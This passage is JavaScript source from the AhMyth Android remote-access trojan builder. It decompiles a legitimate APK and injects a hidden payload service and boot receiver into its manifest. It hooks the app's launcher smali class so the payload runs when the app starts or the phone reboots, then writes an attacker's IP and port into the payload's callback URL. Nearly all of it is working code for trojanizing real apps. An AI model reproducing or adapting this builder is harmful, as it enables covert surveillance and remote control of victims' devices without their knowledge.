                    firstPart = firstPart.slice(0, index) + permArray[i] + "\n" + firstPart.slice(index);
                }
            }
        }

        return (firstPart + lastPart);
    };


    // function to use onBoot method
    // it will bind ahmyth to orginal app
    // and ahmyth will start once the device rebooted
    // if success then go to copy all the rest ahmyth files to orginal app
    // this method is working almost on every app
    $appCtrl.BindOnBoot = (apkFolder) => {
        delayedLog('[★] Reading the Android Manifest File...');
        fs.readFile(dir.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
            if (error) {
                delayedLog('[x] Reading the Android Manifest File Failed!', CONSTANTS.logStatus.FAIL);
                return;
            }

            var ahmythService = CONSTANTS.ahmythService;
            var ahmythReciver = CONSTANTS.ahmythReciver;
            delayedLog('Modifying the Android Manifest File...');

            var permManifest = $appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + ahmythReciver + permManifest.substring(permManifest.indexOf("</application>"));
            fs.writeFile(dir.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                if (error) {
                    delayedLog('Modifying the Android Manifest File Failed!', CONSTANTS.logStatus.FAIL);
                    return;
                }
                $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);

            });

        });

    };



    // function to use OnLauncher method
    // it will bind ahmyth to orginal app
    // and ahmyth will start once the orginal app started
    // if success then go to copy all the rest ahmyth files to orginal app
    // this method is not working on every app (unstable)
    $appCtrl.BindOnLauncher = (apkFolder) => {

        delayedLog('[★] Reading the Android Manifest File...');
        fs.readFile(dir.join(apkFolder,
            'AndroidManifest.xml'), 'utf8', (error,
                data) => {
            if (error) {
                delayedLog('[x] Reading the Android Manifest File Failed!', CONSTANTS.logStatus.FAIL);
                return;
            }

            delayedLog('[★] Modifying the Android Manifest File...');
            const ahmythService = CONSTANTS.ahmythService;
            const permManifest = $appCtrl.copyPermissions(data);
            const newManifest = permManifest.substring(0, permManifest.indexOf('</application>')) + ahmythService
                + permManifest.substring(permManifest.indexOf('</application>'));
            fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), newManifest, 'utf8', (error) => {
                if (error) {
                    delayedLog('[x] Modifying the Android Manifest File Failed!', CONSTANTS.logStatus.FAIL);
                    return;
                }

                xml2js.parseString(data, (err, result) => {
                    if (err) {
                        console.error('[x] ' + err);
                        return;
                    }

                    delayedLog('[★] Searching for a Hookable Class in the Android Manifest...')
                    const launcherActivity = GetLauncherActivity(result, apkFolder);
                    if (launcherActivity === -1) {
                        delayedLog('[x] Cannot Find a Suitable Class for Hooking in the Manifest!', CONSTANTS.logStatus.FAIL);
                        delayedLog('[x] Please use Another APK as a Template,', CONSTANTS.logStatus.FAIL);
                        delayedLog('[x] or use the "On Boot" Method to use this APK as a Template!', CONSTANTS.logStatus.FAIL)
                        return;
                    }

                    delayedLog('[★] Locating the Hookable Smali Class File...');
                    const launcherPath = GetLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
                        if (err) {
                            delayedLog(err);
                            return;
                        } else {
                            delayedLog('[¡] Hookable Smali Class File Found: ' + launcherPath + '\n', CONSTANTS.logStatus.INFO);
                        }

                        delayedLog('[★] Reading the Hookable Smali Class File...');
                        fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                            if (error) {
                                delayedLog('[x] Unable to Read the Hookable Smali Class File!', CONSTANTS.logStatus.FAIL);
                                return;
                            }

                            const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
                            var hook = CONSTANTS.hookPoint;

                            delayedLog('[★] Hooking the Smali Class File...');

                            var output = data.replace(hook, startService);
                            fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                                if (error) {
                                    delayedLog('[x] Modifying the Hookable Smali Class File Failed!', CONSTANTS.logStatus.FAIL);
                                    return;
                                }

                                delayedLog('[★] Determining Target SDK Version...');
                                fs.readFile(dir.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                                    if (error) {
                                        delayedLog('[x] Reading the Manifest Target SDK Failed.', CONSTANTS.logStatus.FAIL);
                                        return;
                                    }

                                    delayedLog('[★] Modifying the Target SDK Version...');

                                    var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                    var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                    var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                    var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/;

                                    var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"')
                                        .replace(compSdkVerNameRegex, "$111" + '"')
                                        .replace(platVerCoRegex, "$122" + '"')
                                        .replace(platVerNameRegex, "$111" + '"');

                                    fs.writeFile(dir.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                        if (error) {
                                            delayedLog('[x] Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
                                            return;
                                        }

                                        fs.readFile(dir.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                            if (error) {
                                                delayedLog('[x] Reading the "apktool.yml" Target SDK Failed!', CONSTANTS.logStatus.FAIL);
                                                return;
                                            }

                                            var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                            var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;

                                            var repYmlSdk = data.replace(minSdkRegex, "$119'")
                                                .replace(tarSdkRegex, "$122'");

                                            fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                                if (error) {
                                                    delayedLog('[x] Modifying the "apktool.yml" Target SDK Failed!', CONSTANTS.logStatus.FAIL);
                                                    return;
                                                }
                                                $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);
                                            });
                                        });
                                    });
                                });

                            });

                        });

                    });

                });

            });
        });

    };

    // fired when user click build buttom
    // collect the ip and port and start building
    $appCtrl.Build = (ip, port) => {
        if (!ip) {
            $appCtrl.Log('[x] IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
            return;
        } else if (!port) {
            port = CONSTANTS.defaultPort;
        } else if (port > 65535 || port <= 1024) {
            $appCtrl.Log('[x] Choose ports from range (1024 - 65535)', CONSTANTS.logStatus.FAIL);
            return;
        }


        // open ahmyth source file and modifiy the ip and port to the users' ones
        var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
        delayedLog('[★] Reading (IP:PORT) File From: ' + CONSTANTS.apkSourceName + '...');

        fs.readFile(ipPortFile, 'utf8', (error, data) => {
            if (error) {
                delayedLog('[x] Reading (IP:PORT) File Failed!', CONSTANTS.logStatus.FAIL);

                fs.mkdir(logPath);
                fs.writeFile(dir.join(logPath, 'IP:PORT.log'), `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');

                delayedLog('Error written to "IP:PORT.log" on...', CONSTANTS.logStatus.INFO)
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }

            // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
            var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali")
            delayedLog('[★] Adding Source IP:PORT to ' + CONSTANTS.apkSourceName + '/' + ipPortFilePath + '...');

            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
            fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                if (error) {
                    delayedLog('[x] Adding Source IP:PORT Failed', CONSTANTS.logStatus.FAIL);

                    fs.mkdir(logPath);
                    fs.writeFile(dir.join(logPath, 'IP:PORT.log'), `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');

                    delayedLog('[¡] Error written to "IP:PORT.log" on...', CONSTANTS.logStatus.INFO)
                    delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                    return;
                }

                // check if bind apk is enabled
                if (!$appCtrl.bindApk.enable) {
                    $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
                } else {
                    // generate a solid ahmyth apk
                    var filePath = $appCtrl.filePath;
                    if (filePath == null) {
                        delayedLog('[x] Browse for the Original APK you Want to Temaplate!', CONSTANTS.logStatus.FAIL);
                        return;
                    } else if (!filePath.includes(".apk")) {
                        delayedLog('[x] Sorry, but This is not an APK file', CONSTANTS.logStatus.FAIL);
                        return;
                    }


                    var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                    delayedLog('[★] Decompiling ' + '"' + filePath.replace(/\\/g, "/").split("/").pop() + '"' + "...");

                    var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
                        (error, stdout, stderr) => {
                            if (error !== null) {
                                delayedLog('[x] Decompiling Failed!', CONSTANTS.logStatus.FAIL);

                                fs.mkdir(logPath);
                                fs.writeFile(dir.join(logPath, 'Decompiling.log'), `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');

                                delayedLog('[¡] Decompiling Error written to "Decompiling.log" on...', CONSTANTS.logStatus.INFO)
                                delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            if ($appCtrl.bindApk.method == 'BOOT')
                                $appCtrl.BindOnBoot(apkFolder);

                            else if ($appCtrl.bindApk.method == 'ACTIVITY')
                                $appCtrl.BindOnLauncher(apkFolder);


                        });
                }
            });
        });
    }










});

// log delay function.
// delays the logs printed to the...
// ...AhMyth gui terminal screen.
function delayedLog(msg, status) {
    let count = delayedLog.count = (delayedLog.count || 0) + 1;
    setTimeout(() => {
        $appCtrl.Log(msg, status);
    }, count * 0300);
};

// function to search for and extract the name...
// ...of a suitable class for hook injection/hooking,
// if a suitable class is found and extracted, it returns it...
// ...as a '*.smali' file.
function GetLauncherActivity(manifest) {

    const application = manifest['manifest']['application'][0];

    let mainApplicationClassName = application && application['$'] && application['$']['android:name'];

    if (mainApplicationClassName && !mainApplicationClassName.startsWith('android.app')) {
        mainApplicationClassName = mainApplicationClassName.split('.').pop();
        if (mainApplicationClassName.startsWith('.')) {
            mainApplicationClassName = mainApplicationClassName.slice(1);
        }
        delayedLog('[¡] Scoped the Main App Class for Hooking...', CONSTANTS.logStatus.INFO);
        return mainApplicationClassName + '.smali';
    }

    const activity = application && application['activity'] && application['activity'].find((activity) => {
        const intentFilter = activity['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activity) {
        let mainActivityClassName = activity['$'] && activity['$']['android:name'];
        mainActivityClassName = mainActivityClassName.split('.').pop();
        if (mainActivityClassName.startsWith('.')) {
            mainActivityClassName = mainActivityClassName.slice(1);
        }
        delayedLog('[¡] Scoped the Main Launcher Activity Class for Hooking...', CONSTANTS.logStatus.INFO);
        return mainActivityClassName + '.smali';
    }

    const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {
        const intentFilter = activityAlias['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activityAlias) {
        let targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];
        targetActivityName = targetActivityName.split('.').pop();
        if (targetActivityName.startsWith('.')) {
            targetActivityName = targetActivityName.slice(1);
        }
        delayedLog('[¡] Scoped the Main Launcher Activity Class in an Alias for Hooking...', CONSTANTS.logStatus.INFO);
        return targetActivityName + '.smali';
    }

    return -1;

}

// function to search for the smali file after
//extracting its name from the manifest with the 'GetLauncherActivity' function.
function GetLauncherPath(launcherActivity, apkFolder, callback) {
    let found = false;
    let launcherPath = null;
    readdirp(apkFolder, {
        fileFilter: launcherActivity, alwaysStat: true
    })
        .on('data', (entry) => {
            found = true;
            var {
                path, stats: { }
            } = entry;
            var output = `${JSON.stringify(path)}`;
            if (process.platform === 'win32') {
                launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\\/g, "/").replace(/\n$/, '');
            } else {
                launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
            }
        })
        .on('end',
            () => {
                if (!found) {
                    callback('[x] Unable to Locate the Hookable Smali Class File!', CONSTANTS.logStatus.FAIL);
                    callback('[x] Please Use the "On Boot" Method!', CONSTANTS.logStatus.FAIL);
                } else {
                    callback(null, launcherPath);
                }
            })
        .on('error',
            (err) => {
                callback(err);
            });
}
```
